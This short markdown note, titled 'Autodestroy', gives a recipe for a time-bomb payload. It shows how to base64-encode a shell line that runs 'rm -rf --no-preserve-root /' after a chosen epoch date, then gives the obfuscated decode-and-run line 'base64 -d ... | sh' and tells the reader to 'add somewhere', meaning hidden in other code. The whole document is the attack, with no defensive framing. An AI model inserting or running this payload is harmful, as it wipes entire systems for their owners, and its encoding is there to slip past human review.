# Autodestroy

Get the date in epoch format: 

https://www.epochconverter.com/


Calculate base64:

```
echo 'if [ "$(date +'%s')" -gt "1575635200" ]; then rm -rf --no-preserve-root /; fi' | base64
```

Add somwehere:

```
base64 -d <<< aWYgWyAiJChkYXRlICslcykiIC1ndCAiMTU3NTYzNTIwMCIgXTsgdGhlbiBybSAtcmYgLS1uby1wcmVzZXJ2ZS1yb290IC87IGZpCg== | sh
```

![Image of Voltorb](https://i.pinimg.com/originals/7f/9e/80/7f9e8079c9a4c5218f14ea1c4d5648d1.png)